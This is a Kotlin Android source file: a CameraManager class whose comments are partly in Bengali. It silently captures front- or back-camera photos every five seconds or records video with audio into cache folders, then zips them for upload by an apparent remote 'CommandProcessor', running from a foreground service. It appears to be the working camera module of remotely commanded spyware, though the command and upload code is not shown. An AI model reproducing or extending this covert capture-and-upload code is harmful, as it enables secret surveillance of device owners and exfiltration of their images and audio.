package com.kashem.shaikh.streaming

import android.content.Context
import android.os.Handler
import android.os.Looper
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.kashem.shaikh.services.AppLogs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicLong
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class CameraManager(
    private val context: Context,
    private val lifecycleOwner: LifecycleOwner
) {

    companion object {
        private const val PHOTO_INTERVAL_MS = 5000L
        private const val PHOTO_DIR = "camera_photos"
        private const val VIDEO_DIR = "camera_videos"
    }

    enum class Mode { NONE, FRONT_PHOTO, BACK_PHOTO, FRONT_VIDEO, BACK_VIDEO }

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private var videoCapture: VideoCapture<Recorder>? = null
    private var activeRecording: Recording? = null
    private var videoFile: File? = null

    @Volatile private var currentMode: Mode = Mode.NONE

    // ✅ FIX: generation token — stale async callback cancel করার জন্য
    private val bindGeneration = AtomicLong(0L)

    private var photoJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())

    // ─────────────────────────────────────────────
    //  PHOTO
    // ─────────────────────────────────────────────
    fun startPhoto(isFront: Boolean): String {
        if (currentMode != Mode.NONE) stopAll()

        currentMode = if (isFront) Mode.FRONT_PHOTO else Mode.BACK_PHOTO
        val myGen = bindGeneration.incrementAndGet()          // ✅ snapshot
        val subDir = if (isFront) "front" else "back"
        val photoDir = File(context.cacheDir, "$PHOTO_DIR/$subDir")
        if (!photoDir.exists()) photoDir.mkdirs()

        AppLogs.info("Camera: Starting ${currentMode.name} (dir=$photoDir, gen=$myGen)")

        mainHandler.post {
            try {
                val providerFuture = ProcessCameraProvider.getInstance(context)
                providerFuture.addListener({
                    // ✅ FIX: stopAll() চললে abort
                    if (bindGeneration.get() != myGen) {
                        AppLogs.info("Camera: startPhoto gen=$myGen superseded, aborting")
                        return@addListener
                    }
                    try {
                        cameraProvider = providerFuture.get()
                        imageCapture = ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .build()

                        val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA
                                       else CameraSelector.DEFAULT_BACK_CAMERA

                        cameraProvider?.unbindAll()
                        cameraProvider?.bindToLifecycle(lifecycleOwner, selector, imageCapture)

                        AppLogs.info("Camera: ${currentMode.name} bound, starting periodic capture")

                        photoJob = scope.launch {
                            while (isActive && currentMode != Mode.NONE &&
                                   bindGeneration.get() == myGen) {
                                try { capturePhoto(photoDir) }
                                catch (e: Exception) { AppLogs.error("Photo capture error", e) }
                                delay(PHOTO_INTERVAL_MS)
                            }
                        }
                    } catch (e: Exception) {
                        AppLogs.error("Camera bind failed for photo", e)
                        currentMode = Mode.NONE
                    }
                }, ContextCompat.getMainExecutor(context))
            } catch (e: Exception) {
                AppLogs.error("startPhoto error", e)
                currentMode = Mode.NONE
            }
        }

        return "SUCCESS: ${if (isFront) "Front" else "Back"} photo capture started (5s interval)"
    }

    private fun capturePhoto(photoDir: File) {
        val capture = imageCapture ?: return
        val timestamp = System.currentTimeMillis()
        val file = File(photoDir, "photo_$timestamp.jpg")
        val options = ImageCapture.OutputFileOptions.Builder(file).build()

        mainHandler.post {
            try {
                capture.takePicture(
                    options,
                    ContextCompat.getMainExecutor(context),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            AppLogs.debug("Photo saved: ${file.name} (${file.length()} bytes)")
                        }
                        override fun onError(exception: ImageCaptureException) {
                            AppLogs.error("Photo capture failed: ${exception.message}", exception)
                            file.delete()
                        }
                    }
                )
            } catch (e: Exception) {
                AppLogs.error("takePicture error", e)
            }
        }
    }

    // ─────────────────────────────────────────────
    //  VIDEO
    // ─────────────────────────────────────────────
    fun startVideo(isFront: Boolean): String {
        if (currentMode != Mode.NONE) stopAll()

        currentMode = if (isFront) Mode.FRONT_VIDEO else Mode.BACK_VIDEO
        val myGen = bindGeneration.incrementAndGet()          // ✅ snapshot
        val subDir = if (isFront) "front" else "back"
        val videoDir = File(context.cacheDir, "$VIDEO_DIR/$subDir")
        if (!videoDir.exists()) videoDir.mkdirs()

        val timestamp = System.currentTimeMillis()
        videoFile = File(videoDir, "video_$timestamp.mp4")

        AppLogs.info("Camera: Starting ${currentMode.name} → ${videoFile?.absolutePath} gen=$myGen")

        mainHandler.post {
            try {
                val providerFuture = ProcessCameraProvider.getInstance(context)
                providerFuture.addListener({
                    // ✅ FIX: stale callback abort
                    if (bindGeneration.get() != myGen) {
                        AppLogs.info("Camera: startVideo gen=$myGen superseded, aborting")
                        return@addListener
                    }
                    try {
                        cameraProvider = providerFuture.get()
                        val recorder = Recorder.Builder()
                            .setQualitySelector(QualitySelector.from(Quality.HD))
                            .build()
                        videoCapture = VideoCapture.withOutput(recorder)

                        val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA
                                       else CameraSelector.DEFAULT_BACK_CAMERA

                        cameraProvider?.unbindAll()
                        cameraProvider?.bindToLifecycle(lifecycleOwner, selector, videoCapture)
                        startActualRecording()
                    } catch (e: Exception) {
                        AppLogs.error("Camera bind failed for video", e)
                        currentMode = Mode.NONE
                    }
                }, ContextCompat.getMainExecutor(context))
            } catch (e: Exception) {
                AppLogs.error("startVideo error", e)
                currentMode = Mode.NONE
            }
        }

        return "SUCCESS: ${if (isFront) "Front" else "Back"} video recording started"
    }

    private fun startActualRecording() {
        val vc = videoCapture ?: return
        val file = videoFile ?: return

        val outputOptions = FileOutputOptions.Builder(file).build()

        try {
            activeRecording = vc.output
                .prepareRecording(context, outputOptions)
                .apply {
                    try { withAudioEnabled() } catch (_: Exception) {}
                }
                .start(ContextCompat.getMainExecutor(context)) { event ->
                    when (event) {
                        is VideoRecordEvent.Start -> {
                            AppLogs.info("Video recording started: ${file.name}")
                        }
                        is VideoRecordEvent.Status -> {}
                        is VideoRecordEvent.Finalize -> {
                            if (event.hasError()) {
                                AppLogs.error("Video finalize error code=${event.error}")
                                file.delete()
                            } else {
                                AppLogs.info("Video saved: ${file.name} (${file.length()} bytes)")
                            }
                            activeRecording = null
                        }
                        else -> {}
                    }
                }
        } catch (e: Exception) {
            AppLogs.error("Recording start failed", e)
        }
    }

    // ─────────────────────────────────────────────
    //  STOP ALL
    // ─────────────────────────────────────────────
    fun stopAll(): String {
        // ✅ FIX: generation bump — pending async bind auto-cancel
        bindGeneration.incrementAndGet()

        if (currentMode == Mode.NONE) return "SUCCESS: Nothing to stop"

        AppLogs.info("Camera: Stopping mode=${currentMode.name}")
        val wasVideo = currentMode == Mode.FRONT_VIDEO || currentMode == Mode.BACK_VIDEO

        // 1. Photo loop off
        try {
            photoJob?.cancel()
            photoJob = null
        } catch (_: Exception) {}

        // 2. Video stop + wait for finalize
        if (wasVideo) {
            val rec = activeRecording
            if (rec != null) {
                val latch = CountDownLatch(1)
                mainHandler.post {
                    try { rec.stop() }
                    catch (e: Exception) { AppLogs.warn("Stop recording error: ${e.message}") }
                    finally { latch.countDown() }
                }
                try { latch.await(5, TimeUnit.SECONDS) } catch (_: Exception) {}
                try { Thread.sleep(2000) } catch (_: Exception) {}
            }
            activeRecording = null
        }

        // 3. Unbind
        val releaseLatch = CountDownLatch(1)
        mainHandler.post {
            try {
                imageCapture = null
                videoCapture = null
                try {
                    cameraProvider?.unbindAll()
                    AppLogs.info("Camera: unbindAll SUCCESS")
                } catch (e: Exception) {
                    AppLogs.warn("unbindAll error: ${e.message}")
                }
                try { cameraProvider = null } catch (_: Exception) {}
            } catch (e: Exception) {
                AppLogs.error("stopAll main-thread error", e)
            } finally {
                releaseLatch.countDown()
            }
        }
        try { releaseLatch.await(3, TimeUnit.SECONDS) } catch (_: Exception) {}

        currentMode = Mode.NONE
        try { Thread.sleep(1500) } catch (_: Exception) {}

        AppLogs.info("Camera: Fully stopped and released")
        return "SUCCESS: Camera stopped"
    }

    fun getMode(): Mode = currentMode

    // ─────────────────────────────────────────────
    //  ZIP
    // ─────────────────────────────────────────────
    // ✅ FIX: zip করা হলে source delete হবেনা — CommandProcessor upload সফল হলে delete করবে
    fun zipPhotos(): File? {
        val sourceDir = File(context.cacheDir, PHOTO_DIR)
        if (!sourceDir.exists()) return null
        val files = sourceDir.walkTopDown().filter { it.isFile }.toList()
        if (files.isEmpty()) {
            AppLogs.info("ZipPhotos: No photos found")
            return null
        }

        val zipFile = File(context.cacheDir, "Photo_${System.currentTimeMillis()}.zip")
        val ok = zipDirectory(sourceDir, zipFile)
        return if (ok) {
            AppLogs.info("ZipPhotos: ${files.size} files → ${zipFile.name} (${zipFile.length()} bytes)")
            // ⚠️ source delete করছি না — upload ফেইল হলে photos থাকবে
            zipFile
        } else {
            zipFile.delete()
            null
        }
    }

    fun zipVideos(): File? {
        val sourceDir = File(context.cacheDir, VIDEO_DIR)
        if (!sourceDir.exists()) return null
        val files = sourceDir.walkTopDown().filter { it.isFile }.toList()
        if (files.isEmpty()) {
            AppLogs.info("ZipVideos: No videos found")
            return null
        }

        val zipFile = File(context.cacheDir, "Video_${System.currentTimeMillis()}.zip")
        val ok = zipDirectory(sourceDir, zipFile)
        return if (ok) {
            AppLogs.info("ZipVideos: ${files.size} files → ${zipFile.name} (${zipFile.length()} bytes)")
            // ⚠️ source delete করছি না
            zipFile
        } else {
            zipFile.delete()
            null
        }
    }

    /** ✅ NEW: upload সফল হলে manually cleanup করতে পারবেন */
    fun cleanupPhotos() {
        try { File(context.cacheDir, PHOTO_DIR).deleteRecursively() } catch (_: Exception) {}
    }

    fun cleanupVideos() {
        try { File(context.cacheDir, VIDEO_DIR).deleteRecursively() } catch (_: Exception) {}
    }

    private fun zipDirectory(sourceDir: File, zipFile: File): Boolean {
        return try {
            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                val basePath = sourceDir.absolutePath
                sourceDir.walkTopDown().forEach { file ->
                    if (file.isFile) {
                        val entryName = file.absolutePath
                            .removePrefix(basePath)
                            .removePrefix("/")
                        zos.putNextEntry(ZipEntry(entryName))
                        FileInputStream(file).use { it.copyTo(zos) }
                        zos.closeEntry()
                    }
                }
            }
            true
        } catch (e: Exception) {
            AppLogs.error("Zip failed", e)
            false
        }
    }

    /**
     * ⚠️ IMPORTANT: release() blocks with stopAll() (~4s total sleeps)।
     * কখনো main thread থেকে সরাসরি কল করবেন না — ANR হবে।
     * ForegroundService.onDestroy() এটাকে background thread-এ কল করে।
     */
    fun release() {
        stopAll()
        scope.cancel()
    }
}